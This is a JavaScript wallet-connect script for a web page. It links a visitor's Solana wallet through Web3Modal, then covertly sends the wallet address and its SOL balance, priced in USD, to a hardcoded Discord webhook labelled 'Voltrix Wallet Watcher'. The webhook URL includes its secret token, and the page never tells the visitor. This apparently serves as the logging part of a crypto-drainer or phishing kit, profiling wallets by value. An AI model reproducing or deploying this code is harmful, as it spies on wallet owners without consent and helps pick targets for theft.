// === Import Solana Modules ===
import "https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js";
import "https://unpkg.com/@web3modal/solana@latest/dist/index.umd.js";
import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.6.2";

// === Web3Modal Setup for Solana Only ===
const solanaWallet = new window.Web3ModalSolana.SolanaWalletAdapter();

const web3Modal = new Web3Modal({
  projectId: "24cb4618162c124a24e58a917ab7cc45", // your actual project ID
  cacheProvider: false,
  providerOptions: {
    solana: {
      package: window.Web3ModalSolana,
      connector: async () => solanaWallet
    }
  },
  themeMode: "light",
});

// === Discord Webhook ===
const webhookURL = "https://discord.com/api/webhooks/1364326652473114644/8fTaSHHEVBU1xJThC5V3xwAuXonQlwC3xwE0CJh0CoJ9l5RQmArpqJfzieQNHV23rMiR";

// === Solana Wallet Connect Handler ===
async function connectSolanaWallet() {
  try {
    await solanaWallet.connect();
    const publicKey = solanaWallet.publicKey.toString();

    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
    const balance = await connection.getBalance(solanaWallet.publicKey);
    const sol = balance / solanaWeb3.LAMPORTS_PER_SOL;

    const usdPrice = await getUSDPrice("solana");
    const usdValue = usdPrice ? (sol * usdPrice).toFixed(2) : null;

    await sendToDiscordEmbed({
      address: publicKey,
      nativeBalances: [{ chain: "Solana", symbol: "SOL", amount: sol.toFixed(6), usd: usdValue }],
      tokenSections: []
    });
  } catch (err) {
    console.error("Solana connect error:", err);
  }
}

// === Fetch USD Price from CoinGecko ===
async function getUSDPrice(symbol) {
  try {
    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${symbol}&vs_currencies=usd`);
    const data = await res.json();
    return data[symbol]?.usd || null;
  } catch {
    return null;
  }
}

// === Send to Discord Embed ===
async function sendToDiscordEmbed({ address, nativeBalances, tokenSections }) {
  const embed = {
    title: `💼 Wallet Connected`,
    description: `**👤 Wallet:** \`${address}\``,
    color: 0x00ffcc,
    fields: [
      {
        name: `💰 Native Balances`,
        value: nativeBalances.map(n => `**${n.chain}**: ${n.symbol} ${n.amount} ${n.usd ? `($${n.usd})` : ""}`).join("\n"),
        inline: false
      },
      ...tokenSections.map(section => ({
        name: `📜 Tokens on ${section.chain}`,
        value: section.tokens.map(t => `- ${t.symbol}: ${t.amount} ${t.usd ? `($${t.usd})` : ""}`).join("\n"),
        inline: false
      }))
    ],
    footer: { text: `Voltrix Wallet Watcher` },
    timestamp: new Date().toISOString()
  };

  await fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ embeds: [embed] })
  });
}

// === Attach Listener to w3m-core-button ===
document.addEventListener("DOMContentLoaded", () => {
  const connectBtn = document.querySelector("w3m-core-button");
  if (connectBtn) {
    connectBtn.addEventListener("click", connectSolanaWallet);
  } else {
    console.error("w3m-core-button not found");
  }
});
